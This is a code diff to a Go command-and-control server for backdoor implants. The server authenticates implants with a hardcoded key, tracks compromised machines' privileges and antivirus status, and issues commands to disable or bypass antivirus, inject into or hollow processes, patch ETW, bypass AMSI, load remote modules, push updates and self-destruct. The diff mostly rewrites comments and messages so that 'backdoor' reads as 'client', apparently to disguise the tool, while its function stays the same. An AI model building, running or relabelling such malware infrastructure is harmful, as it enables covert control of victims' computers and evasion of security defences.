@@ -16,50 +16,54 @@ import (
 )
 
 const (
-	ServerPort = "443"           // Server port
-	SecretKey  = "magic_key_123" // Secret key for authentication
-	Timeout    = 30 * time.Second
-	CertFile   = "server.crt"    // Certificate file
-	KeyFile    = "server.key"    // Private key file
-	CMD_DISABLE_AV     = "disable_av"
-	CMD_BYPASS_AV      = "bypass_av"
-	CMD_INJECT_PROCESS = "inject_process"
-	CMD_HOLLOW_PROCESS = "hollow_process"
-	CMD_PATCH_ETW      = "patch_etw"
-	CMD_BYPASS_AMSI    = "bypass_amsi"
+	ServerPort = "443"           // HTTPS port for secure communication
+	SecretKey  = "magic_key_123" // Authentication key for client validation
+	Timeout    = 30 * time.Second // Connection timeout
+	CertFile   = "server.crt"    // TLS certificate file
+	KeyFile    = "server.key"    // TLS private key file
+	
+	// Command constants for antivirus management
+	CMD_DISABLE_AV     = "disable_av"      // Command to disable antivirus
+	CMD_BYPASS_AV      = "bypass_av"       // Command to bypass antivirus
+	CMD_INJECT_PROCESS = "inject_process"  // Command for process injection
+	CMD_HOLLOW_PROCESS = "hollow_process"  // Command for process hollowing
+	CMD_PATCH_ETW      = "patch_etw"       // Command to patch ETW
+	CMD_BYPASS_AMSI    = "bypass_amsi"     // Command to bypass AMSI
 )
 
-// Structure for storing backdoor information
+// Structure for storing client information
 type Backdoor struct {
-	ID         string
-	Conn       net.Conn
-	Privileges string
-	Version    string
-	LastSeen   time.Time
-	OS         string
-	Arch       string
-	IsAdmin    bool
-	HasUAC     bool
-	CanElevate bool
-	AVStatus   string    // Статус антивируса
-	Protection []string  // Активные защиты
+	ID         string    // Unique client identifier
+	Conn       net.Conn  // Network connection
+	Privileges string    // Current privilege level
+	Version    string    // Client version
+	LastSeen   time.Time // Last activity timestamp
+	OS         string    // Operating system
+	Arch       string    // Architecture
+	IsAdmin    bool      // Administrative privileges flag
+	HasUAC     bool      // UAC status (Windows)
+	CanElevate bool      // Privilege escalation possibility
+	AVStatus   string    // Antivirus status
+	Protection []string  // Active protection mechanisms
 }
 
 var (
-	activeBots = make(map[string]*Backdoor)
-	mutex      = &sync.Mutex{}
-	currentVersion = "1.0.0"
-	binaryChecksum = "" // Will be set at startup
-	updateURL = "https://example.com/backdoor/latest" // URL for updates
+	activeBots = make(map[string]*Backdoor) // Map of active connections
+	mutex      = &sync.Mutex{}              // Mutex for thread-safe access
+	currentVersion = "1.0.0"                // Current server version
+	binaryChecksum = ""                     // Client binary checksum
+	updateURL = "https://example.com/client/latest" // Update server URL
 )
 
-// Function for TLS setup
+// Function for TLS configuration setup
 func setupTLS() (*tls.Config, error) {
+	// Load certificate and private key
 	cert, err := tls.LoadX509KeyPair(CertFile, KeyFile)
 	if err != nil {
 		return nil, fmt.Errorf("error loading certificates: %v", err)
 	}
 
+	// Configure TLS with modern security settings
 	return &tls.Config{
 		Certificates: []tls.Certificate{cert},
 		MinVersion:  tls.VersionTLS12,
@@ -70,16 +74,17 @@ func setupTLS() (*tls.Config, error) {
 	}, nil
 }
 
-// Function for connection validation
+// Function for validating incoming connections
 func validateConnection(conn net.Conn) bool {
-	// Check IP address
+	// Extract client IP address
 	remoteIP := strings.Split(conn.RemoteAddr().String(), ":")[0]
 	
-	// Check for suspicious IPs
+	// List of suspicious IP ranges to block
 	suspiciousIPs := []string{
 		"0.0.0.0", "127.0.0.1", "192.168.", "10.", "172.16.",
 	}
 	
+	// Check if client IP is in suspicious range
 	for _, ip := range suspiciousIPs {
 		if strings.HasPrefix(remoteIP, ip) {
 			return false
@@ -89,12 +94,12 @@ func validateConnection(conn net.Conn) bool {
 	return true
 }
 
-// Function for data obfuscation
+// Data obfuscation using base64 encoding
 func obfuscate(data string) string {
 	return base64.StdEncoding.EncodeToString([]byte(data))
 }
 
-// Function for data deobfuscation
+// Data deobfuscation from base64
 func deobfuscate(data string) string {
 	decoded, err := base64.StdEncoding.DecodeString(data)
 	if err != nil {
@@ -103,7 +108,7 @@ func deobfuscate(data string) string {
 	return string(decoded)
 }
 
-// Function for calculating file checksum
+// Calculate SHA-256 checksum of a file
 func calculateChecksum(filePath string) (string, error) {
 	file, err := os.Open(filePath)
 	if err != nil {
@@ -119,14 +124,14 @@ func calculateChecksum(filePath string) (string, error) {
 	return hex.EncodeToString(hash.Sum(nil)), nil
 }
 
-// Function for handling backdoor connections
+// Main function for handling client connections
 func handleConnection(conn net.Conn) {
 	defer conn.Close()
 
-	// Set timeout
+	// Set connection timeout
 	conn.SetDeadline(time.Now().Add(Timeout))
 
-	// Authentication
+	// Authenticate client
 	reader := bufio.NewReader(conn)
 	key, err := reader.ReadString('\n')
 	if err != nil {
@@ -134,12 +139,13 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 
+	// Validate authentication key
 	if deobfuscate(strings.TrimSpace(key)) != SecretKey {
 		fmt.Println("Invalid authentication key")
 		return
 	}
 
-	// Get system information
+	// Receive and parse system information
 	sysInfo, err := reader.ReadString('\n')
 	if err != nil {
 		return
@@ -150,7 +156,7 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 
-	// Create backdoor structure
+	// Create new client structure
 	backdoor := &Backdoor{
 		ID:         conn.RemoteAddr().String(),
 		Conn:       conn,
@@ -166,15 +172,15 @@ func handleConnection(conn net.Conn) {
 		Protection: strings.Split(parts[7], ","),
 	}
 
-	// Register backdoor
+	// Register new client
 	mutex.Lock()
 	activeBots[backdoor.ID] = backdoor
 	mutex.Unlock()
 
-	fmt.Printf("[+] New backdoor connected: %s (OS: %s/%s, Privileges: %s, UAC: %v)\n",
+	fmt.Printf("[+] New client connected: %s (OS: %s/%s, Privileges: %s, UAC: %v)\n",
 		backdoor.ID, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.HasUAC)
 
-	// Command handling
+	// Main command handling loop
 	for {
 		command, err := reader.ReadString('\n')
 		if err != nil {
@@ -201,18 +207,20 @@ func handleConnection(conn net.Conn) {
 			handleCommand(backdoor, command)
 		}
 
-		// Update last seen time
+		// Update last activity timestamp
 		backdoor.LastSeen = time.Now()
 	}
 
-	// Remove backdoor from active list
+	// Remove disconnected client
 	mutex.Lock()
 	delete(activeBots, backdoor.ID)
 	mutex.Unlock()
-	fmt.Printf("[-] Backdoor disconnected: %s\n", backdoor.ID)
+	fmt.Printf("[-] Client disconnected: %s\n", backdoor.ID)
 }
 
-// Command handlers
+// Command handlers for various client requests
+
+// Handle version check and update notification
 func handleUpdateCheck(b *Backdoor, command string) {
 	version := strings.TrimPrefix(command, "check_update:")
 	if version < currentVersion {
@@ -223,27 +231,31 @@ func handleUpdateCheck(b *Backdoor, command string) {
 	}
 }
 
+// Handle checksum verification request
 func handleChecksumRequest(b *Backdoor) {
 	b.Conn.Write([]byte(obfuscate(binaryChecksum + "\n")))
 }
 
+// Handle binary download request
 func handleBinaryRequest(b *Backdoor) {
 	b.Conn.Write([]byte(obfuscate(updateURL + "\n")))
 }
 
+// Handle client heartbeat
 func handleHeartbeat(b *Backdoor) {
 	b.LastSeen = time.Now()
 	b.Conn.Write([]byte(obfuscate("ok\n")))
 }
 
+// Handle general command execution
 func handleCommand(b *Backdoor, command string) {
-	// Log command
+	// Log command execution
 	fmt.Printf("[%s] Executing command: %s\n", b.ID, command)
 	
-	// Send command
+	// Send command to client
 	b.Conn.Write([]byte(obfuscate(command + "\n")))
 	
-	// Get result
+	// Receive command result
 	reader := bufio.NewReader(b.Conn)
 	result, err := reader.ReadString('\n')
 	if err != nil {
@@ -254,7 +266,7 @@ func handleCommand(b *Backdoor, command string) {
 	fmt.Printf("[Result from %s]:\n%s\n", b.ID, deobfuscate(strings.TrimSpace(result)))
 }
 
-// Function for monitoring active backdoors
+// Monitor active clients and remove inactive ones
 func monitorBackdoors() {
 	for {
 		time.Sleep(60 * time.Second)
@@ -263,7 +275,7 @@ func monitorBackdoors() {
 		mutex.Lock()
 		for id, backdoor := range activeBots {
 			if now.Sub(backdoor.LastSeen) > 5*time.Minute {
-				fmt.Printf("[!] Backdoor %s not responding, removing\n", id)
+				fmt.Printf("[!] Client %s not responding, removing\n", id)
 				backdoor.Conn.Close()
 				delete(activeBots, id)
 			}
@@ -272,49 +284,49 @@ func monitorBackdoors() {
 	}
 }
 
-// Function for displaying menu
+// Display interactive menu
 func showMenu() {
-	fmt.Println("\nBackdoor Management Menu:")
-	fmt.Println("1. List active backdoors")
-	fmt.Println("2. Send command to backdoor")
-	fmt.Println("3. Load module to backdoor")
-	fmt.Println("4. Update backdoors")
-	fmt.Println("5. Remove backdoor")
-	fmt.Println("6. Backdoor information")
+	fmt.Println("\nClient Management Menu:")
+	fmt.Println("1. List active clients")
+	fmt.Println("2. Send command to client")
+	fmt.Println("3. Load module to client")
+	fmt.Println("4. Update clients")
+	fmt.Println("5. Remove client")
+	fmt.Println("6. Client information")
 	fmt.Println("7. Broadcast command")
 	fmt.Println("8. Antivirus management")
 	fmt.Println("9. Exit")
 }
 
-// Function for displaying backdoor information
+// Display detailed client information
 func showBackdoorInfo(id string) {
 	mutex.Lock()
 	defer mutex.Unlock()
 
 	if backdoor, ok := activeBots[id]; ok {
-		fmt.Printf("\nBackdoor information %s:\n", id)
+		fmt.Printf("\nClient information %s:\n", id)
 		fmt.Printf("Operating System: %s\n", backdoor.OS)
 		fmt.Printf("Privileges: %s\n", backdoor.Privileges)
 		fmt.Printf("Version: %s\n", backdoor.Version)
 		fmt.Printf("Last seen: %s\n", backdoor.LastSeen.Format("2006-01-02 15:04:05"))
 	} else {
-		fmt.Println("Backdoor not found!")
+		fmt.Println("Client not found!")
 	}
 }
 
-// Function for broadcasting commands
+// Broadcast command to all connected clients
 func broadcastCommand(command string) {
 	mutex.Lock()
 	defer mutex.Unlock()
 
 	for id, backdoor := range activeBots {
-		fmt.Printf("Sending command to backdoor %s...\n", id)
+		fmt.Printf("Sending command to client %s...\n", id)
 		backdoor.Conn.SetDeadline(time.Now().Add(Timeout))
 		backdoor.Conn.Write([]byte(obfuscate(command + "\n")))
 	}
 }
 
-// Function for antivirus management
+// Handle antivirus management operations
 func handleAVManagement(backdoor *Backdoor) {
 	fmt.Println("\nAntivirus Management:")
 	fmt.Println("1. Disable antivirus")
@@ -347,14 +359,14 @@ func handleAVManagement(backdoor *Backdoor) {
 
 // Main server function
 func main() {
-	// Setup TLS
+	// Initialize TLS configuration
 	tlsConfig, err := setupTLS()
 	if err != nil {
 		fmt.Println("Error setting up TLS:", err)
 		return
 	}
 
-	// Start server with TLS
+	// Start TLS server
 	listener, err := tls.Listen("tcp", ":"+ServerPort, tlsConfig)
 	if err != nil {
 		fmt.Println("Error starting server:", err)
@@ -364,10 +376,10 @@ func main() {
 	
 	fmt.Println("Server started on port", ServerPort, "with TLS")
 
-	// Start backdoor monitoring
+	// Start client monitoring
 	go monitorBackdoors()
 
-	// Handle connections
+	// Handle incoming connections
 	go func() {
 		for {
 			conn, err := listener.Accept()
@@ -376,7 +388,7 @@ func main() {
 				continue
 			}
 
-			// Validate connection
+			// Validate incoming connection
 			if !validateConnection(conn) {
 				fmt.Printf("Suspicious connection from %s\n", conn.RemoteAddr())
 				conn.Close()
@@ -387,7 +399,7 @@ func main() {
 		}
 	}()
 
-	// Main menu
+	// Main menu loop
 	for {
 		showMenu()
 		var choice int
@@ -396,8 +408,8 @@ func main() {
 
 		switch choice {
 		case 1:
-			// List active backdoors
-			fmt.Println("\nActive backdoors:")
+			// List active clients
+			fmt.Println("\nActive clients:")
 			mutex.Lock()
 			for id, backdoor := range activeBots {
 				fmt.Printf("[%s] OS: %s/%s, Privileges: %s, Version: %s\n",
@@ -406,8 +418,8 @@ func main() {
 			mutex.Unlock()
 
 		case 2:
-			// Send command to backdoor
-			fmt.Print("Enter backdoor ID: ")
+			// Send command to specific client
+			fmt.Print("Enter client ID: ")
 			scanner := bufio.NewScanner(os.Stdin)
 			scanner.Scan()
 			botID := strings.TrimSpace(scanner.Text())
@@ -420,13 +432,13 @@ func main() {
 			if backdoor, ok := activeBots[botID]; ok {
 				handleCommand(backdoor, command)
 			} else {
-				fmt.Println("Backdoor not found!")
+				fmt.Println("Client not found!")
 			}
 			mutex.Unlock()
 
 		case 3:
-			// Load module to backdoor
-			fmt.Print("Enter backdoor ID: ")
+			// Load module to client
+			fmt.Print("Enter client ID: ")
 			scanner := bufio.NewScanner(os.Stdin)
 			scanner.Scan()
 			botID := strings.TrimSpace(scanner.Text())
@@ -439,23 +451,23 @@ func main() {
 			if backdoor, ok := activeBots[botID]; ok {
 				handleCommand(backdoor, "load_module:"+moduleURL)
 			} else {
-				fmt.Println("Backdoor not found!")
+				fmt.Println("Client not found!")
 			}
 			mutex.Unlock()
 
 		case 4:
-			// Update backdoors
+			// Update clients
 			fmt.Print("Enter new version: ")
 			scanner := bufio.NewScanner(os.Stdin)
 			scanner.Scan()
 			newVersion := strings.TrimSpace(scanner.Text())
 			
 			currentVersion = newVersion
-			fmt.Println("Version updated. Backdoors will update on next check.")
+			fmt.Println("Version updated. Clients will update on next check.")
 
 		case 5:
-			// Remove backdoor
-			fmt.Print("Enter backdoor ID: ")
+			// Remove client
+			fmt.Print("Enter client ID: ")
 			scanner := bufio.NewScanner(os.Stdin)
 			scanner.Scan()
 			botID := strings.TrimSpace(scanner.Text())
@@ -465,13 +477,13 @@ func main() {
 				handleCommand(backdoor, "self_destruct")
 				delete(activeBots, botID)
 			} else {
-				fmt.Println("Backdoor not found!")
+				fmt.Println("Client not found!")
 			}
 			mutex.Unlock()
 
 		case 6:
-			// Backdoor information
-			fmt.Print("Enter backdoor ID: ")
+			// Show client information
+			fmt.Print("Enter client ID: ")
 			scanner := bufio.NewScanner(os.Stdin)
 			scanner.Scan()
 			botID := strings.TrimSpace(scanner.Text())
@@ -479,7 +491,7 @@ func main() {
 
 		case 7:
 			// Broadcast command
-			fmt.Print("Enter command for all backdoors: ")
+			fmt.Print("Enter command for all clients: ")
 			scanner := bufio.NewScanner(os.Stdin)
 			scanner.Scan()
 			command := strings.TrimSpace(scanner.Text())
@@ -487,7 +499,7 @@ func main() {
 
 		case 8:
 			// Antivirus management
-			fmt.Print("Enter backdoor ID: ")
+			fmt.Print("Enter client ID: ")
 			scanner := bufio.NewScanner(os.Stdin)
 			scanner.Scan()
 			botID := strings.TrimSpace(scanner.Text())
@@ -496,12 +508,12 @@ func main() {
 			if backdoor, ok := activeBots[botID]; ok {
 				handleAVManagement(backdoor)
 			} else {
-				fmt.Println("Backdoor not found!")
+				fmt.Println("Client not found!")
 			}
 			mutex.Unlock()
 
 		case 9:
-			// Exit
+			// Exit program
 			fmt.Println("Exiting...")
 			return
 
